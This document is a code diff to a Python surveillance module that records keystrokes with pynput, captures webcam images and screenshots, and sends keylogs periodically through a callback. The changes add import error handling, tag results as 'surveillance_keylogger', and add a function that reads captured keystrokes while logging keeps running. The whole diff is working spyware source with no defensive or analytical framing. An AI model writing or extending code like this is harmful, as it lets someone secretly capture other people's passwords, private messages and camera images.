@@ -4,10 +4,26 @@ import logging
 import tempfile
 from datetime import datetime
 import pyautogui
-import cv2
-from pynput import keyboard
 import threading
 import time
+
+# Handle cv2 import with error handling
+try:
+    import cv2
+    CV2_AVAILABLE = True
+except ImportError as e:
+    logging.warning(f"OpenCV not available: {e}")
+    CV2_AVAILABLE = False
+    cv2 = None
+
+# Handle pynput import with error handling
+try:
+    from pynput import keyboard
+    PYNPUT_AVAILABLE = True
+except ImportError as e:
+    logging.warning(f"pynput not available: {e}")
+    PYNPUT_AVAILABLE = False
+    keyboard = None
 
 # Global keylogger state
 keylogger_running = False
@@ -54,6 +70,13 @@ def take_screenshot():
 def capture_webcam(timeout=5):
     """Capture an image from the webcam with timeout"""
     try:
+        if not CV2_AVAILABLE:
+            return {
+                'status': 'error',
+                'error': 'OpenCV not available',
+                'timestamp': datetime.now().isoformat()
+            }
+            
         # Initialize webcam
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
@@ -147,6 +170,10 @@ def periodic_keylog_send(interval=30):
 # Modify start_keylogger to accept a send callback
 def start_keylogger(send_callback=None):
     global keylogger_running, keylogger_listener, keylog_send_callback
+    if not PYNPUT_AVAILABLE:
+        logging.warning("Cannot start keylogger: pynput not available")
+        return {'status': 'error', 'error': 'pynput not available'}
+        
     if not keylogger_running:
         try:
             keylog_send_callback = send_callback
@@ -159,7 +186,8 @@ def start_keylogger(send_callback=None):
             return {
                 'status': 'success',
                 'message': 'Keylogger started',
-                'timestamp': datetime.now().isoformat()
+                'timestamp': datetime.now().isoformat(),
+                'type': 'surveillance_keylogger'
             }
         except Exception as e:
             logging.error(f"Error starting keylogger: {str(e)}")
@@ -171,8 +199,9 @@ def start_keylogger(send_callback=None):
     else:
         return {
             'status': 'error',
-            'error': 'Keylogger already running',
-            'timestamp': datetime.now().isoformat()
+            'message': 'Keylogger already running',
+            'timestamp': datetime.now().isoformat(),
+            'type': 'surveillance_keylogger'
         }
 
 # Modify stop_keylogger to include full text
@@ -184,13 +213,23 @@ def stop_keylogger():
             keylogger_running = False
             keys = captured_keys.copy()
             full_text = ''.join([k['key'] for k in keys])
+            
+            # Enhanced text processing
+            processed_text = full_text
+            word_count = len([word for word in full_text.split() if word.strip()])
+            character_count = len(full_text)
+            
             captured_keys = []
             return {
                 'status': 'success',
                 'message': 'Keylogger stopped',
                 'captured_keys': keys,
                 'text': full_text,
-                'timestamp': datetime.now().isoformat()
+                'processed_text': processed_text,
+                'word_count': word_count,
+                'character_count': character_count,
+                'timestamp': datetime.now().isoformat(),
+                'type': 'surveillance_keylogger'
             }
         except Exception as e:
             logging.error(f"Error stopping keylogger: {str(e)}")
@@ -203,6 +242,41 @@ def stop_keylogger():
         return {
             'status': 'error',
             'error': 'Keylogger not running',
+            'timestamp': datetime.now().isoformat()
+        }
+
+def get_current_keylogger_text():
+    """Get current text from keylogger without stopping it"""
+    global keylogger_running, captured_keys
+    if keylogger_running:
+        try:
+            # Build current text from captured keys
+            current_text = ''.join([k['key'] for k in captured_keys])
+            
+            # Simple word counting (split by spaces and count non-empty words)
+            words = [word for word in current_text.split() if word.strip()]
+            word_count = len(words)
+            character_count = len(current_text)
+            
+            return {
+                'status': 'success',
+                'message': 'Current text retrieved',
+                'processed_text': current_text,
+                'word_count': word_count,
+                'character_count': character_count,
+                'is_running': keylogger_running
+            }
+        except Exception as e:
+            logging.error(f"Error getting current keylogger text: {str(e)}")
+            return {
+                'status': 'error',
+                'error': str(e),
+                'timestamp': datetime.now().isoformat()
+            }
+    else:
+        return {
+            'status': 'error',
+            'message': 'Keylogger not running',
             'timestamp': datetime.now().isoformat()
         }
 
